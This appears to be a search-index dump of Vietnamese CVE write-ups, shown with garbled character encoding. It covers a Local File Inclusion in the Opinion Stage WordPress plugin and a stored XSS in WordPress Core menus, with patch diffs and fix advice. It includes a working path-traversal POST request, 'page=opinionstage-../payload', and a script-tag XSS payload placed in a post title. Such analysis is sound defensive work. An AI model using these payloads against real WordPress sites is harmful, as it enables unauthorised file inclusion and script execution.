Inclusion/Path traversal ‚Äî Hacktrick WordPress Geo Mashup Plugin \u003c= 1.13.16 is vulnerable to Local File Inclusion ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage phi√™n b·∫£n ‚â§ 19.11.0 ch·ª©a l·ªó h·ªïng Local File Inclusion (CVE-2025-53328, CVSS 7.5) cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Quan tr·ªçng M·∫∑c d√π l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë l√† Unauthenticated, trong th·ª±c t·∫ø vi·ªác khai th√°c ƒë√≤i h·ªèi k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn n·ªôi b·ªô t·ªëi thi·ªÉu ‚Äî v√≠ d·ª• t√†i kho·∫£n Contributor ho·∫∑c quy·ªÅn t∆∞∆°ng ƒë∆∞∆°ng tr√™n WordPress ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) v√† 19.11.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } Trong phi√™n b·∫£n vulnerable, page param ƒë∆∞·ª£c l·∫•y t·ª´ $_REQUEST do ng∆∞·ªùi d√πng ki·ªÉm so√°t nh∆∞ng kh√¥ng x√°c minh h·ª£p l·ªá c·ªßa t√™n file =\u003e Cho ph√©p Local File Inclusion. Trong h√†m n√†y ch·ªâ c√≥ c√°c logic lo·∫°i b·ªè c√°c k√Ω t·ª± HTML b·∫±ng sanitize_text_field v√† ki·ªÉm tra ti·ªÅn t·ªë opinionstage- sau ƒë√≥ lo·∫°i b·ªè ti·ªÅn t·ªë v√† thay - b·∫±ng _ n√™n attacker c√≥ th·ªÉ truy·ªÅn: ?page=opinionstage-../../wp-config B·∫£n v√°: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } B·∫£n v√° ƒë√£ b·ªï sung nhi·ªÅu l·ªõp b·∫£o v·ªá nh∆∞ ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu, x√°c minh prefix \"opinionstage-\", √°p d·ª•ng whitelist (self::$allowed_templates), ngƒÉn traversal k√Ω t·ª± nguy hi·ªÉm ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m prepare_view_file_name_form_current_page() ƒë∆∞·ª£c g·ªçi t·ª´ load_template() public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë 'admin/views/'.$view_file_name public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } require() h√†m ch√≠nh g√¢y LFI ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $path l√† gi√° tr·ªã concat t·ª´ ƒë∆∞·ªùng d·∫´n c·ªßa plugin (plugin_path), $template_name, .php public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_MENU_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'View My Items', 'My Items', 'edit_posts', OPINIONSTAGE_MENU_SLUG ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'Tutorials \u0026 Help', 'Tutorials \u0026 Help', 'edit_posts', OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, 'load_template' ] ); } else { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, 'Get Started', 'Get Started', 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, 'load_template' ] ); } } } register_menu_page() s·∫Ω register 2 submenu v·ªõi load_template l√†m callback d·ª±a tr√™n tr·∫°ng th√°i ƒëƒÉng nh·∫≠p c·ªßa ng∆∞·ªùi d√πng ƒê·ªÉ truy c·∫≠p v√†o submenu c·ªßa admin ng∆∞·ªùi d√πng c·∫ßn ph·∫£i login v√†o WordPress v·ªõi ƒë·∫∑c quy·ªÅn t·ªëi thi·ªÉu l√† Contributor =\u003e ƒë·∫∑c quy·ªÅn y√™u c·∫ßu c·ªßa CVE n√†y l√† Contributor 2 slug ƒë∆∞·ª£c khai b√°o cho 2 submenu: const string OPINIONSTAGE_MENU_SLUG = \"opinionstage-settings\" const string OPINIONSTAGE_GETTING_STARTED_SLUG = \"opinionstage-getting-started\" ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLogin b·∫±ng t√†i kho·∫£n Contributor G·ª≠i POST request: POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin X-PwnFox-Color: green Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 28 page=opinionstage-../payload Debugging: Debug - Gi√° tr·ªã c·ªßa $view_file_name Debug - Gi√° tr·ªã c·ªßa $path ƒë∆∞·ª£c require File payload.php ƒë∆∞·ª£c t·∫°o ƒë·ªÉ th·ª≠ nghi·ªám \u003c?php echo \"ABC\"; Result K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Explain\rTa t·∫≠n d·ª•ng c√°ch WordPress v√† Plugin x·ª≠ l√Ω tham s·ªë: WordPress x√°c ƒë·ªãnh trang qu·∫£n tr·ªã d·ª±a tr√™n page trong URL, nh∆∞ng plugin l·∫°i ƒë·ªçc page t·ª´ $_REQUEST - m√† $_REQUEST s·∫Ω ∆∞u ti√™n gi√° tr·ªã t·ª´ body khi request l√† POST. V√¨ v·∫≠y ta g·ª≠i m·ªôt POST t·ªõi admin.php?page=opinionstage-getting-started (page h·ª£p l·ªá tr√™n URL ƒë·ªÉ g·ªçi callback), ƒë·ªìng th·ªùi ƒë·∫∑t page=opinionstage-../payload trong body c·ªßa POST. K·∫øt qu·∫£: WordPress ch·∫•p nh·∫≠n URL v√† g·ªçi callback, c√≤n plugin l·∫•y page t·ª´ $_REQUEST (body) ch·ª©a payload ../ ‚Äî cho ph√©p v∆∞·ª£t th∆∞ m·ª•c v√† khai th√°c LFI. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-53328 l√† LFI do d√πng input page kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ƒë·ªÉ t·∫°o ƒë∆∞·ªùng d·∫´n file cho require() - ti·ªÅn t·ªë opinionstage- ƒë∆∞·ª£c ch·∫•p nh·∫≠n nh∆∞ng ph·∫ßn sau c√≥ th·ªÉ ch·ª©a .. / \\ ƒë·ªÉ v∆∞·ª£t th∆∞ m·ª•c. B·∫£n v√° (v19.11.1) th√™m ki·ªÉm tra ki·ªÉu, ch·∫∑n traversal v√† whitelist template. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng d√πng input user tr·ª±c ti·∫øp ƒë·ªÉ x√¢y path cho include/require. √Åp d·ª•ng whitelist (ho·∫∑c mapping) cho t√™n template. Ch·∫∑n .., /, \\ ho·∫∑c d√πng realpath() so v·ªõi th∆∞ m·ª•c g·ªëc. C·∫≠p nh·∫≠t plugin l√™n 19.11.1 ngay. ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin \u003c= 19.11.0 is vulnerable to Local File Inclusion ","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng Stored Cross Site Scripting(XSS) x·∫£y ra tr√™n WordPress Core tr∆∞·ªõc phi√™n b·∫£n 6.8.3. Nguy√™n nh√¢n do sai x·ª≠ l√Ω ƒë·∫ßu v√†o khi sinh trang web ƒë·ªông, t√°c ƒë·ªông ƒë·∫øn ch·ª©c nƒÉng t·∫°o menu (nav menus) CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Wordpress Core Versions: v6.8.2 (vulnerable) v√† v6.8.3 (patched). Diff Tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Theme - Astra: Theme r·∫•t ph·ªï bi·∫øn v·ªõi ng∆∞·ªùi d√πng WordPress, h·ªó tr·ª£ t·∫°o nav memu nhanh ch√≥ng. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rWordPress l√† ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü, c√≥ kho l∆∞u tr·ªØ n·∫±m ·ªü github n√™n ta c√≥ th·ªÉ t√¨m ƒë·∫øn commit li√™n quan ƒë·∫øn s·ª± ki·ªán v√° l·ªó h·ªïng XSS ƒë·ªÉ quan s√°t s·ª± thay ƒë·ªïi, hi·ªÉu ƒë∆∞·ª£c l·ªó h·ªïng x·∫£y ra ·ªü ƒë√¢u. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã menuTitle ƒë∆∞·ª£c ch√®n v√†o th·∫ª \u003coption\u003e v√† ƒë∆∞·ª£c hi·ªÉn th·ªã ra HTML b·∫±ng ph∆∞∆°ng th·ª©c html() c·ªßa jQuery m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ngƒÉn ch·∫∑n XSS n√†o. H√†m html() d√πng ƒë·ªÉ thay th·∫ø n·ªôi dung HTML b√™n trong ph·∫ßn t·ª≠ hi·ªán t·∫°i, n√™n n·∫øu menuTitle ch·ª©a m√£ ƒë·ªôc th√¨ m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi tr√™n tr√¨nh duy·ªát. B·∫£n v√°: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e', { value: menuID.toString(), selected: currentParentID === menuID, text: menuTitle, } ) ); } }); }); }); }, B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch ch·ªâ ƒë·ªãnh r√µ menuTitle ƒë∆∞·ª£c g√°n v√†o thu·ªôc t√≠nh text thay v√¨ n·ªôi dung HTML. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o gi√° tr·ªã c·ªßa menuTitle ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ vƒÉn b·∫£n thu·∫ßn t√∫y, kh√¥ng th·ªÉ ch·ª©a ho·∫∑c th·ª±c thi m√£ JavaScript ƒë·ªôc h·∫°i. Nh·ªù ƒë√≥, d·ªØ li·ªáu ƒë∆∞·ª£c th√™m v√†o th·∫ª \u003coption\u003e ho√†n to√†n an to√†n v√† lo·∫°i b·ªè kh·∫£ nƒÉng t·∫•n c√¥ng XSS th√¥ng qua gi√° tr·ªã menuTitle. So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rInpsect code tr√™n tr√¨nh duy·ªát ta th·∫•y menuItems = #menu-to-edit li l√† m·∫£ng c√°c th·∫ª \u003cli\u003e thu·ªôc th·∫ª \u003cul\u003e c√≥ id=menu-to-edit Inspect code tr√™n tr√¨nh duy·ªát H√†m updateParentDropdown s·∫Ω duy·ªát c√°c th·∫ª \u003cli\u003e l·∫•y value c·ªßa \u003cinput\u003e c√≥ class edit-menu-item-title, g√°n gi√° tr·ªã ƒë√≥ cho menuTitle trong th·∫ª \u003coption\u003e v√† hi·ªÉn th·ªã ra HTML. Inspect DOM sau khi th√™m menu Tr√™n UI: H√¨nh ·∫£nh hi·ªÉn th·ªã tr√™n giao di·ªán qu·∫£n tr·ªã Trong commit c√≥ m·ªôt s·ª≠a ƒë·ªïi t∆∞·ªüng ch·ª´ng l√† h·ªØu √≠ch, nh∆∞ng ch·∫£ c√≥ √≠ch cho qu√° tr√¨nh ph√¢n t√≠ch. HTML entity encode (1) T√¥i ƒë√£ s·ª≠ d·ª•ng // ƒë·ªÉ comment t·∫•t c·∫£ c√°c d√≤ng li√™n quan ƒë·∫øn html_entity_decode c·ªßa origin_title nh∆∞ng v·∫´n khai th√°c ƒë∆∞·ª£c. Tr∆∞·ªõc ƒë√≥ t√¥i ƒë√£ ƒë·∫∑t debug ƒë·∫øn c√°c v·ªã tr√≠ n√†y nh∆∞ng kh√¥ng c√≥ g√¨ x·∫£y ra. Ngo√†i vi·ªác s·ª≠ d·ª•ng comment, t√¥i ƒë√£ ch·ªçn menu ch·ª©a XSS payload v√† click Add to Menu, b·∫Øt request b·∫±ng BurpSuite ƒë·ªÉ xem gi√° tr·ªã ƒë∆∞·ª£c add c√≥ ƒë∆∞·ª£c html entity encode kh√¥ng. HTML entity encode (2) menu-item-title l√† gi√° tr·ªã l·∫•y th·∫ª input c√≥ name menu-item[-5][menu-item-title] t·ª´ post-title ƒë∆∞·ª£c check ƒë·ªÉ th√™m v√†o body c·ªßa request \u003cinput type=\"hidden\" class=\"menu-item-title\" name=\"menu-item[-5][menu-item-title]\" value=\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\"\u003e C√≥ 1 ƒëi·ªÅu th√∫ v·ªã ·ªü ƒë√¢y, tr√¨nh duy·ªát l·∫•y gi√° tr·ªã ƒë√£ decode html entity ƒë·ªÉ th√™m v√†o request, bi·∫øt gi√° tr·ªã t·ª´ server tr∆∞·ªõc khi echo ra HTML ƒë√£ ƒë∆∞·ª£c encode Tr√¨nh duy·ªát decode HTML entity tr∆∞·ªõc khi g·ª≠i üëâ Browser ƒë√£ decode html entity tr∆∞·ªõc khi hi·ªÉn th·ªã ra HTML. Tr√™n DOM, sau khi click Add to Menu =\u003e attachTabsPanelListeners ƒë∆∞·ª£c g·ªçi v√† th√™m gi√° tr·ªã v·ª´a selected v√†o bottom c·ªßa menu item. Th√™m item v√†o cu·ªëi danh s√°ch menu üëâ edit-menu-item-title c√≥ gi√° tr·ªã ch·ª©a XSS payload. H√†m updateParentDropdown s·∫Ω l·∫•y n√≥ g√°n cho th·∫ª \u003coption\u003e =\u003e XSS x·∫£y ra ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: post-title ti√™u ƒë·ªÅ c·ªßa post Sink: parentDropdown.html( $html ) c√≥ th·ªÉ ch·ª©a HTML ƒë·ªôc h·∫°i $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rS·ª≠ d·ª•ng t√†i kho·∫£n author, t·∫°o post c√≥ title ch·ª©a XSS payload Admin truy c·∫≠p endpoint wp-admin/nav-menus.php v√† th·ª±c hi·ªán add menus t·ª´ post v·ª´a t·∫°o S·ª± ki·ªán Javascript ƒë∆∞·ª£c k√≠ch ho·∫°t Proof of Concept: XSS Th·∫ª \u003cscript\u003e n·∫±m trong \u003coption\u003e thu·ªôc \u003cselect\u003e c√≥ th·ªÉ th·ª±c thi ƒë∆∞·ª£c nh∆∞ng c√°c th·∫ª kh√°c th√¨ kh√¥ng, ch·ªâ tr·∫£ v·ªÅ text ch·ª©a trong ƒë√≥. {: .prompt-info } Khi browser parse chu·ªói HTML, \u003cscript\u003e kh√¥ng n·∫±m trong flow \u003coption\u003e th·ª±c s·ª± m√† parser ‚Äúnh·∫•c‚Äù script ra kh·ªèi \u003coption\u003e v√† ƒë∆∞a v√†o DOM tree. \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/option\u003e \u003c/select\u003e V√¨ th·∫ø, script th·ª±c thi ngay, c√≤n \u003coption\u003e v·∫´n t·ªìn t·∫°i, nh∆∞ng n·ªôi dung \u003coption\u003e tr·ªëng ho·∫∑c hi·ªÉn th·ªã text r·ªóng. Inspect DOM sau khi script ƒë∆∞·ª£c t√°ch ƒê·ªëi v·ªõi c√°c th·∫ª kh√°c \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cb\u003eabd\u003c/b\u003e\u003c/option\u003e \u003c/select\u003e Browser tu√¢n th·ªß spec: \u003coption\u003e ch·ªâ ch·ª©a text-only. Khi parse \u003cb\u003e ho·∫∑c \u003cimg\u003e trong \u003coption\u003e: \u003cb\u003e b·ªã coi l√† text =\u003e m·∫•t tag, ch·ªâ hi·ªÉn th·ªã abd nh∆∞ text. \u003cimg\u003e b·ªã lo·∫°i b·ªè ho√†n to√†n. Inspect: render option v·ªõi th·∫ª inline ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-58674 cho th·∫•y r·ªßi ro khi ch√®n d·ªØ li·ªáu ng∆∞·ªùi d√πng tr·ª±c ti·∫øp v√†o HTML b·∫±ng html() ho·∫∑c innerHTML. \u003cscript\u003e trong \u003coption\u003e ƒë∆∞·ª£c parser t√°ch ra v√† th·ª±c thi, trong khi c√°c th·∫ª kh√°c b·ªã b·ªè ho·∫∑c coi l√† text. B·∫£n v√° s·ª≠ d·ª•ng thu·ªôc 